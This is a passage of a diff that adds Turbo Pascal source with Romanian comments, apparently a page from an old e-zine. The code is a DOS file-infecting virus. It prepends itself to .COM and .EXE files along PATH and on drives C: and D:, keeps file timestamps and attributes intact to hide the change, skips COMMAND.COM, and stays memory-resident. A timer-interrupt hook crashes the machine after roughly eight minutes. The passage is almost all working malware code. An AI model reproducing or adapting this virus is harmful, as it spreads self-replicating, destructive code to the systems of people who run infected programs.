+ close(f2);
+end;
+
+Procedure stripf;
+
+begin
+ assign(f,s);
+ reset(f,1);
+ getftime(f,t);
+ assign(f2,ds+imf);
+ rewrite(f2,1);
+ seek(f,vsize);
+ copyf;
+end;
+
+.eop
+
+procedure load;                         { incarca virusul din fisier         }
+
+begin
+ assign(f,s);
+ getfattr(f,attr);
+ reset(f,1);
+ if ioresult=0 then
+  begin
+   getftime(f,t);                       { obtinerea datei si timpului        }
+   blockread(f,v^,vsize,nr);
+   count:=v^[vsize]-1;
+
+   v^[vsize]:=maxruns;
+   seek(f,vsize-1);
+   blockwrite(f,count,1,nr);
+   setftime(f,t);
+   close(f);
+   setfattr(f,attr);
+  end;
+end;
+
+function checkf(pth:dirstr):boolean;    { verifica daca este deja infectat   }
+
+var by:array[1..27] of byte;
+
+begin
+ checkf:=false;
+ if pos(sr.name,'COMMAND.COM')=0 then   { sa nu infecteze COMMAND.COM        }
+ begin
+  assign(f,pth+sr.name);
+  reset(f,1);
+  if ioresult=0 then
+   begin
+    blockread(f,by,27,nr);
+    for indx:=1 to 27 do
+     if (by[indx])<>(v^[indx]) then
+      checkf:=true;
+    close(f);
+   end;
+ end;
+end;
+
+.eop
+
+procedure attach(pth:dirstr);           { ataseaza virusul la incepultul fis }
+begin
+ inc(inf);
+ assign(f2,pth+'zSqA.th');              { creaza fisierul temporar           }
+ rewrite(f2,1);
+ if ioresult=0 then
+  begin
+   assign(f,pth+sr.name);
+   getfattr(f,attr);
+   reset(f,1);
+   getftime(f,t);
+   blockwrite(f2,v^,vsize,nr);
+   copyf;
+   erase(f);
+   rename(f2,sr.name);
+   setfattr(f2,attr);
+  end;
+end;
+
+procedure rep(pth:dirstr;ext:extstr);
+
+begin
+ findfirst(pth+wc+ext,hidden+archive+readonly,sr);
+ while (inf<maxinf) and (doserror=0) do { cauta fisiere pt infectare         }
+  begin
+   if checkf(pth) then attach(pth);
+   findnext(sr);
+  end;
+end;
+
+procedure wastetime;interrupt;          { handler-ul pt intreruperea 1Ch     }
+begin
+ inc(t);
+ inline($90/$90/$90/$90/$90/$90);       { NOP NOP NOP NOP NOP NOP            }
+ if ((t mod 8640)=8639) then inline($4C); { crash dupa cca 8 minute          }
+end;
+
+.eop
+
+procedure replicate;
+
+var tmp:dirstr;
+
+begin
+ while (ps<>'') do
+  begin
+   indx:=pos(';',ps);
+   if indx=0 then
+    begin
+     tmp:=ps;
+     ps:='';
+    end
+   else
+    begin
+     tmp:=copy(ps,1,indx-1);
+     ps:=copy(ps,indx+1,length(ps)-indx);
+    end;
+   if tmp[length(tmp)]<>'\' then tmp:=tmp+'\';
+
+   rep(tmp,'cOm');                              { infecteaza *.COM           }
+   rep(tmp,'exE');                              { infecteaza *.EXE           }
+  end;
+end;
+
+.eop
+
+procedure makep;
+
+var b:byte;
+
+begin
+ getdir(0,ps);                                  { obtine drive-ul curent     }
+ for b:=3 to 4 do
+  begin
+   ps:=ps+';'+drives[b]+cb+';';
+   findfirst(drives[b]+cb+wc,directory,sr);
+   while (doserror=0) and (length(ps)<240) do
+    begin
+     ps:=ps+drives[b]+cb+sr.name+';';
+     findnext(sr);
+    end;
+  end;
+end;
+
+procedure grow;
+
+begin
+ inf:=0;                        { reseteaza contorul de infectii             }
+ ps:=getenv('path');
+ if ps<>'' then replicate;
+ if inf<maxinf then
+  begin
+   makep;
+   replicate;
+  end;
+end;
+
+procedure remove;               { routina de dezinfectie                     }
+begin
+ assign(f,s);
+ erase(f);
+ assign(f,ds+imf);
+ rename(f,ns+es);
+end;
+
+.eop
+
+
+procedure runf;                 { ruleaza fisierul original                  }
+begin
+ exec(ds+imf,paramstr(1)+paramstr(2)+paramstr(3));
+ assign(f,ds+imf);
+ erase(f);
+end;
+
+begin
+ new(v);
+ new(buf);
+ s:=paramstr(0);
+ fsplit(s,ds,ns,es);
+ stripf;
+ load;
+ grow;
+ if count=0 then remove;
+ runf;
+ if count<3 then
+  begin
+   t:=0;
+   setintvec($1c,@wastetime);
+   keep(0);                       { ramane rezident                          }
+  end;
+end.
+.font 5 4
+.color 0
+
+------------<taie de aici in sus>-----------------------------------
+.eop
+
+
+
+
+
+
+
